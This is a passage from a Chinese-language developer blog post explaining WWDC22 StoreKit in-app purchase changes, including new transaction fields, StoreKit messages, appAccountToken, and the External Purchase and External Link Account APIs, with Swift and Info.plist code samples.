class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后说明一下，App Transaction 的内容，首次启动时，StoreKit 会自动获取更新并保持最新状态。当您的 app 无法通过 <code>shared</code> 属性获得 App Transaction 时（包括返回 <a href="https://developer.apple.com/documentation/storekit/apptransaction/4020517-refresh">Verification.unverified(<em>:</em>:)</a> 或抛出异常错误），可以使用 <a href="https://developer.apple.com/documentation/storekit/apptransaction/4020517-refresh">refresh()</a> 刷新 App 交易内容，但是刷新时，系统会弹窗提示用户可能需要重新授权认证 Apple ID 账号，所以建议是提供用户操作的按钮，由用户主动发起调用。</p><h4 id="New-properties（新特性）"><a href="#New-properties（新特性）" class="headerlink" title="New properties（新特性）"></a>New properties（新特性）</h4><p>StoreKit 2 带来了新的四个字段：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-03.png" alt="WWDC22-IAP-03"></p><ul><li>价格地区</li><li>交易的服务器环境</li><li>最近的订阅开始日期</li><li>哨兵值（占位符值）</li></ul><p><strong>Price locale</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">15.0</span>, <span class="keyword">macOS</span> <span class="number">12.0</span>, <span class="keyword">tvOS</span> <span class="number">15.0</span>, <span class="keyword">watchOS</span> <span class="number">8.0</span>, <span class="operator">*</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">var</span> priceFormatStyle: <span class="type">Decimal</span>.<span class="type">FormatStyle</span>.<span class="type">Currency</span> &#123; <span class="keyword">get</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">15.0</span>, <span class="keyword">macOS</span> <span class="number">12.0</span>, <span class="keyword">tvOS</span> <span class="number">15.0</span>, <span class="keyword">watchOS</span> <span class="number">8.0</span>, <span class="operator">*</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">var</span> subscriptionPeriodFormatStyle: <span class="type">Date</span>.<span class="type">ComponentsFormatStyle</span> &#123; <span class="keyword">get</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增 <a href="https://developer.apple.com/documentation/storekit/product/4044347-priceformatstyle">priceFormatStyle</a> 和 <a href="https://developer.apple.com/documentation/storekit/product/4044348-subscriptionperiodformatstyle">subscriptionPeriodFormatStyle</a> 字段。一般情况下，苹果建议尽可能使用 <a href="https://developer.apple.com/documentation/storekit/product/3749580-displayprice">displayPrice</a> 字段表示格式。例如从 <a href="https://developer.apple.com/documentation/storekit/product/3749586-price">price</a> 属性获取两个品项的价格，例如 <code>2 products for $(</code>price * 2<code>)</code>。</p><p><strong>Server environment</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">struct</span> <span class="title">Transaction</span> : <span class="title">Identifiable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">16.0</span>, <span class="keyword">macOS</span> <span class="number">13.0</span>, <span class="keyword">tvOS</span> <span class="number">16.0</span>, <span class="keyword">watchOS</span> <span class="number">9.0</span>, <span class="operator">*</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">let</span> environment: <span class="type">AppStore</span>.<span class="type">Environment</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">@available</span>(<span class="keyword">iOS</span>, introduced: <span class="number">15.0</span>, deprecated: <span class="number">16.0</span>, message: <span class="string">&quot;Use the environment property instead&quot;</span>)</span><br><span class="line">    <span class="keyword">@available</span>(<span class="keyword">macOS</span>, introduced: <span class="number">12.0</span>, deprecated: <span class="number">13.0</span>, message: <span class="string">&quot;Use the environment property instead&quot;</span>)</span><br><span class="line">    <span class="keyword">@available</span>(<span class="keyword">tvOS</span>, introduced: <span class="number">15.0</span>, deprecated: <span class="number">16.0</span>, message: <span class="string">&quot;Use the environment property instead&quot;</span>)</span><br><span class="line">    <span class="keyword">@available</span>(<span class="keyword">watchOS</span>, introduced: <span class="number">8.0</span>, deprecated: <span class="number">9.0</span>, message: <span class="string">&quot;Use the environment property instead&quot;</span>)</span><br><span class="line">    <span class="keyword">@available</span>(<span class="keyword">macCatalyst</span>, introduced: <span class="number">15.0</span>, deprecated: <span class="number">16.0</span>, message: <span class="string">&quot;Use the environment property instead&quot;</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">var</span> environmentStringRepresentation: <span class="type">String</span> &#123; <span class="keyword">get</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 iOS 16+ 使用 <a href="https://developer.apple.com/documentation/storekit/transaction/3963920-environment">environment</a> 结构体，在 iOS 15 使用 <a href="https://developer.apple.com/documentation/storekit/transaction/3976514-environmentstringrepresentation">environmentStringRepresentation</a> 字段。</p><p>获取到的字段值：</p><table><thead><tr><th>环境</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>App Store</td><td><code>Production</code></td><td>App Store 商店包环境的交易</td></tr><tr><td>App Store Sandbox 或 TestFlight</td><td><code>Sandbox</code></td><td>Develop 或 TestFlight 环境的交易</td></tr><tr><td>Xcode StoreKit Testing</td><td><code>Xcode</code></td><td>使用 Xcode 进行 StoreKit 测试的交易</td></tr></tbody></table><p><strong>Recent subscription start date</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Product</span>.<span class="title">SubscriptionInfo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">struct</span> <span class="title">RenewalInfo</span> </span>&#123;</span><br><span class="line">        <span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">15.0</span>, <span class="keyword">macOS</span> <span class="number">12.0</span>, <span class="keyword">tvOS</span> <span class="number">15.0</span>, <span class="keyword">watchOS</span> <span class="number">8.0</span>, <span class="operator">*</span>)</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">var</span> recentSubscriptionStartDate: <span class="type">Date</span> &#123; <span class="keyword">get</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://developer.apple.com/documentation/storekit/product/subscriptioninfo/renewalinfo/3976513-recentsubscriptionstartdate">recentSubscriptionStartDate</a> 表示自动续期订阅购买中订阅的最早开始日期，忽略了超过 60 天的所有续费失败的订阅。</p><p>需要注意的是，不要使用 recentSubscriptionStart 字段日期来计算付费服务天数，以前，自动续期订阅的净收入结构和 App Store 上的其他商业模式不同，用户订阅累积满一年后，开发者的 <a href="https://developer.apple.com/cn/app-store/subscriptions/#revenue-after-one-year">收入将增加到订阅价格的 85%</a>。所以，开发者不能依据这个字段来判断用户订阅是否满一年。另外，如果开发者当前注册了 <a href="https://developer.apple.com/cn/app-store/subscriptions/#revenue-after-one-year">App Store Small Business Program</a>，符合条件的情况下，无论订阅是否已累积满一年，其实在每个结算周期收到订阅价格的  85%。</p><p><strong>Sentinel values</strong></p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-04.png" alt="WWDC22-IAP-04"></p><p>另外，在不支持的系统和环境中，就会使用 <code>Sentinel values</code> 哨兵值（占位符值），例如 Price local 下使用 <code>Locale(identifier: &quot;xx\_XX&quot;)</code>，而 Recent subscription start date 使用 <code>Date.distantPast</code> 等。这是为什么呢？</p><p>因为以上的字段，其它在 Xcode13 和 iOS 15 是不存在的！苹果利用 Xcode 14 提供了对 iOS 15, iPadOS 15, macOS 12, Mac Catalyst 15, watchOS 9, tvOS 15 等的支持。原理是通过 Xcode 14 编译 app 时，会带上这些字段在 app 包体中，低系统的用户更新包含这些字段的版本时，就能使用。（具体是怎么编译和实现，有懂的朋友欢迎留言交流，小编暂时还没有找到相关文档。）</p><p>另外，JWS Transaction 的 Payload 内也新增 environment、recentSubscriptionStartDate 相关字段，下文会提到。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-05.png" alt="WWDC22-IAP-05"></p><h4 id="SwiftUI-API"><a href="#SwiftUI-API" class="headerlink" title="SwiftUI API"></a>SwiftUI API</h4><p>针对 SwiftUI 增加了优惠代码兑换接口和应用内评分接口。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-06.png" alt="WWDC22-IAP-06"></p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-07.png" alt="WWDC22-IAP-07"></p><h4 id="StoreKit-messages"><a href="#StoreKit-messages" class="headerlink" title="StoreKit messages"></a>StoreKit messages</h4><p>StoreKit <a href="https://developer.apple.com/documentation/storekit/message">Message</a> API 只支持 iOS 16+，用于开发者在 app 中接收和显示 App Store 消息处理。举例来说，自动续期订阅的费用涨价时，如果需要用户确认同意涨价，就需要弹窗给用于确认：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-08.png" alt="WWDC22-IAP-08"></p><p>具体的 StoreKit messages 交互流程图：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-09.png" alt="WWDC22-IAP-09"></p><p>获取 App Store messages 消息，使用 SwiftUI 实现的代码示例：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-10.png" alt="WWDC22-IAP-10"></p><p>然后显示 App Store messages 消息，需要通过 SwiftUI 环境变量 <code>displayStoreKitMessage</code> 来解析和显示，使用 SwiftUI 实现的代码示例：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-11.png" alt="WWDC22-IAP-11"></p><h4 id="applicationUsername-和-appAccountToken"><a href="#applicationUsername-和-appAccountToken" class="headerlink" title="applicationUsername 和 appAccountToken"></a>applicationUsername 和 appAccountToken</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> payment <span class="operator">=</span> <span class="type">SKMutablePayment</span>(product: product)</span><br><span class="line">payment.applicationUsername <span class="operator">=</span> uuidString</span><br><span class="line"></span><br><span class="line"><span class="type">SKPaymentQueue</span>.default().add(payment)</span><br></pre></td></tr></table></figure><p><a href="https://developer.apple.com/documentation/storekit/skmutablepayment/1506088-applicationusername">applicationUsername</a> 是 Original StoreKit 创建苹果订单时，由开发者赋值的一个字段，原本这个字段是传入用户 UID 的 Hash 值，作用是给苹果验证应用购买以防止欺诈，比如代充和黑产恶意充值等。</p><p>而 <a href="https://developer.apple.com/documentation/storekit/transaction/3749684-appaccounttoken">appAccountToken</a> 是去年 WWDC21 推出 StoreKit 2 的一个字段，用于开发者将苹果交易与自己服务上的用户关联的 UUID 格式的字段。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-12.png" alt="WWDC22-IAP-12"></p><p>而现在，苹果打通了 applicationUsername 和 appAccountToken，当用 Original StoreKit 创建订单时，applicationUsername 字段赋值使用 UUID 格式内容时，则可以在服务端通知或者解析 receipt 票据时，可以获取这个 UUID 值，也就是订单可以关联确认。</p><p>我们回顾一下，我们为什么需要使用 <code>applicationUsername</code>？我们是希望每个交易 transaction 可以关联用户订单号，对于订阅类型和非消耗类型品项，关联用户 UID 就能满足需求，但是对于非消耗型品项，其实，需要关联用户 UID 还有订单号 OrderID，因为非消耗型品项可以重复购买并且没有 UID 的强关联。举例来说，游戏里的用户账号可能不止一个，或者一个账号下的游戏角色，通常不止有一个角色，所以购买非消耗型品项时，开发者希望关联的是当前用户 UID 和此角色 RoleID 生成的开发者订单号 OrderID，但此时，UUID 格式并不能满足开发者自定义的需求！</p><p>所以，applicationUsername 和 appAccountToken 的透传值，对开发者有一定的关联作用，但其实还不完美。</p><h4 id="External-Purchase（外部购买，第三方支付）"><a href="#External-Purchase（外部购买，第三方支付）" class="headerlink" title="External Purchase（外部购买，第三方支付）"></a>External Purchase（外部购买，第三方支付）</h4><p>符合条件的 app 可以包含一个链接，引导使用该 app 的用户访问网站进行外部购买。要包含该链接，请完成此授权的请求。有关符合条件的 app 和请求此授权的更多信息，请参阅：</p><ul><li><a href="https://developer.apple.com/support/storekit-external-entitlement/">在荷兰分发约会 App</a></li><li><a href="https://developer.apple.com/support/storekit-external-entitlement-kr/">在韩国使用第三方支付提供商分发 App</a> </li></ul><p>具体的细节这里不说，就重点说说代码。首先，需要更新 app 的 Info.plist 文件，添加权限：</p><ul><li><a href="https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_storekit_external-purchase?changes=latest_major&language=ob_8">com.apple.developer.storekit.external-purchase</a> ：表示您的 app 是否可以提供外部购买。</li><li><a href="https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_storekit_external-purchase-link?changes=latest_major&language=ob_8">com.apple.developer.storekit.external-purchase-link</a> ：表示您的 app 是否可以包含一个链接，引导用户访问网站进行外部购买。</li><li><a href="https://developer.apple.com/documentation/bundleresources/information_property_list/skexternalpurchase?changes=latest_major&language=ob_8">SKExternalPurchase</a> ：表示您的 app 可以提供外部购买的国家或地区。</li><li><a href="https://developer.apple.com/documentation/bundleresources/information_property_list/skexternalpurchaselink?changes=latest_major&language=ob_8">SKExternalPurchaseLink</a> ：表示您的 app 可以提供外部购买的国家或地区和对应的用户访问网站进行外部购买的链接。</li></ul><p>配置示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.developer.storekit.external-purchase<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.developer.storekit.external-purchase-link<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>SKExternalPurchase<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>nl<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">key</span>&gt;</span>SKExternalPurchaseLink<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">key</span>&gt;</span>nl<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>https://www.iHTCboy.com<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后就是接口调用，在 iOS 或 iPadOS 15.4 或更高版本，使用 StoreKit <a href="https://developer.apple.com/documentation/storekit/external_purchase">External Purchase</a> API：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">15.4</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">macOS</span>, unavailable)</span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">tvOS</span>, unavailable)</span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">watchOS</span>, unavailable)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">ExternalPurchase</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// The result of presenting the external purchase notice sheet.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">NoticeResult</span> : <span class="title">Sendable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/// The user chose to continue to view external purchases.</span></span><br><span class="line">        <span class="keyword">case</span> continued</span><br><span class="line"></span><br><span class="line">        <span class="comment">/// The user chose to cancel and **not** view external purchases.</span></span><br><span class="line">        <span class="keyword">case</span> cancelled</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">func</span> <span class="title">==</span> (<span class="params">a</span>: <span class="type">ExternalPurchase</span>.<span class="type">NoticeResult</span>, <span class="params">b</span>: <span class="type">ExternalPurchase</span>.<span class="type">NoticeResult</span>)</span> -&gt; <span class="type">Bool</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">func</span> <span class="title">hash</span>(<span class="params">into</span> <span class="params">hasher</span>: <span class="keyword">inout</span> <span class="type">Hasher</span>)</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">var</span> hashValue: <span class="type">Int</span> &#123; <span class="keyword">get</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Present a notice sheet to users before showing external purchases.</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// Only call this method as a result of deliberate user interaction, such as tapping a button.</span></span><br><span class="line">    <span class="comment">/// - Returns: Whether the user chose to continue to view the external purchases. Only show</span></span><br><span class="line">    <span class="comment">///            external purchases if the result is `NoticeResult.continued`.</span></span><br><span class="line">    <span class="comment">/// - Throws: A `StoreKitError`</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">func</span> <span class="title">presentNoticeSheet</span>()</span> <span class="keyword">async</span> <span class="keyword">throws</span> -&gt; <span class="type">ExternalPurchase</span>.<span class="type">NoticeResult</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ihtcboy.com/images/WWDC22-IAP-13.png" alt="WWDC22-IAP-13"></p><p>如图所示，按照苹果的规范，使用外部购买必须要的步骤：</p><ol><li>检查当前设备允许付款</li><li>对于运行 iOS 和 iPadOS 15.4 或更高版本的设备，使用 StoreKit ExternalPurchase API</li><li>对于低于 iOS 和 iPadOS 15.4 系统，使用上图的 UI 设计和文本内容提示用户</li></ol><p>在 iOS 和 iPadOS 15.4 运行的代码示例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前设备不能支付，则不能进行购买~</span></span><br><span class="line"><span class="keyword">guard</span> <span class="type">AppStore</span>.canMakePayments <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 打开外部购买流程</span></span><br><span class="line">    <span class="keyword">let</span> res <span class="operator">=</span> <span class="keyword">try</span> <span class="keyword">await</span> <span class="type">ExternalPurchase</span>.presentNoticeSheet()</span><br><span class="line">    <span class="comment">// 打开结果</span></span><br><span class="line">    <span class="keyword">switch</span> res &#123;</span><br><span class="line">    <span class="keyword">case</span> .continued:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户选择继续查看外部购买&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> .cancelled:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户选择取消，不查看外部购买&quot;</span>)</span><br><span class="line">    <span class="keyword">@unknown</span> <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fatalError</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="comment">// 异常流程</span></span><br><span class="line">    <span class="built_in">print</span>(error.localizedDescription)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意事项：</p><ul><li>获取苹果许可权限后，您才可以在 app 中包含第三方支付系统</li><li>只有用户点击 <code>I Understand</code>（我明白）后，才能跳转到第三方支付系统</li><li>不包含任何隐藏、休眠或苹果未允许的支付功能或行为</li><li>只能在苹果允许的国家或地区的 App Store 商店使用第三方支付系统</li></ul><h4 id="External-Link-Account（访问外部网站的链接）"><a href="#External-Link-Account（访问外部网站的链接）" class="headerlink" title="External Link Account（访问外部网站的链接）"></a>External Link Account（访问外部网站的链接）</h4><blockquote><p>阅读器 App 是指将提供以下一种或多种数字内容类型作为其主要功能的 App：杂志、报纸、图书、音频、音乐或视频。</p></blockquote><p>通过阅读器 App，用户可以登录他们在 App 之外创建的帐户，从而可以在用户的 Apple 设备上阅览和畅读先前购买的媒体内容或内容订阅。开发者可以提供指向 app 网站的链接，以便用户在 app 网站上创建和管理帐户。有关符合条件的 app 和请求此授权的更多信息，请参阅：</p><ul><li><a href="https://developer.apple.com/cn/support/reader-apps/">分发包含指向您网站的链接的“阅读器” App</a></li></ul><p>同理，首先，需要更新 app 的 Info.plist 文件，添加权限：</p><ul><li><a href="https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_storekit_external-link_account">com.apple.developer.storekit.external-link.account</a> ：表示您的 app 是否可以链接到外部网站进行帐户创建或管理。</li><li><a href="https://developer.apple.com/documentation/bundleresources/information_property_list/skexternallinkaccount">SKExternalLinkAccount</a> ：表示您的 app 可以提供外部创建或管理帐户的国家或地区，和对应的用户访问创建或管理帐户网站的链接。</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.developer.storekit.external-link.account<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>SKExternalLinkAccount<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>*<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>https://www.iHTCboy.com<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>jp<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>https://www.iHTCboy.com/jp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后就是接口调用，在 iOS 或 iPadOS 16 或更高版本，使用 StoreKit <a href="https://developer.apple.com/documentation/storekit/external_link_account">External Link Account</a> API：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">16.0</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">macOS</span>, unavailable)</span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">tvOS</span>, unavailable)</span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">watchOS</span>, unavailable)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">ExternalLinkAccount</span> : <span class="title">Sendable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Whether the app can open the external link account.</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// Check this property before showing any UI controls that the user can use to open the external link</span></span><br><span class="line">    <span class="comment">/// account.</span></span><br><span class="line">    <span class="comment">/// You may want to check the value of this property again when the App Store storefront changes.</span></span><br><span class="line">    <span class="comment">/// - Important: If this property is `false`, do not show UI controls that call `open()` as the</span></span><br><span class="line">    <span class="comment">///              method will always fail.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">var</span> canOpen: <span class="type">Bool</span> &#123; <span class="keyword">get</span> <span class="keyword">async</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Opens the external link account in the user&#x27;s default browser.</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// Only call this method as a result of deliberate user interaction, such as tapping a button. If</span></span><br><span class="line">    <span class="comment">/// `canOpen` is `false`, this method will always throw an error. Returning without throwing an error</span></span><br><span class="line">    <span class="comment">/// does not guarantee the user was redirected to the external link account.</span></span><br><span class="line">    <span class="comment">/// - Throws: A `StoreKitError`</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">func</span> <span class="title">open</span>()</span> <span class="keyword">async</span> <span class="keyword">throws</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ihtcboy.com/images/WWDC22-IAP-14.png" alt="WWDC22-IAP-14"></p><p>如图所示，按照苹果的规范，使用外部购买必须要的步骤：</p><ol><li>检查当前设备允许付款</li><li>对于运行 iOS 和 iPadOS 16 或更高版本的设备，使用 StoreKit ExternalPurchase API</li><li>对于低于 iOS 和 iPadOS 16 系统，使用上图的 UI 设计和文本内容提示用户，<strong>并且必须是使用默认浏览器中打开一个新窗口</strong>，而不能使用 App 的 WebView 打开</li></ol><p>在 iOS 和 iPadOS 15.4 运行的代码示例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">16.0</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">externalLinkAccount</span>()</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当前设备不能支付，则不能进行购买~</span></span><br><span class="line">    <span class="keyword">guard</span> <span class="type">AppStore</span>.canMakePayments <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">Task</span> &#123;</span><br><span class="line">        <span class="comment">// 判断是否有打开外部链接帐户的权限</span></span><br><span class="line">        <span class="keyword">let</span> canOpen <span class="operator">=</span> <span class="keyword">await</span> <span class="type">ExternalLinkAccount</span>.canOpen</span><br><span class="line">        <span class="keyword">guard</span> canOpen <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;不能打开外部链接帐户&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// 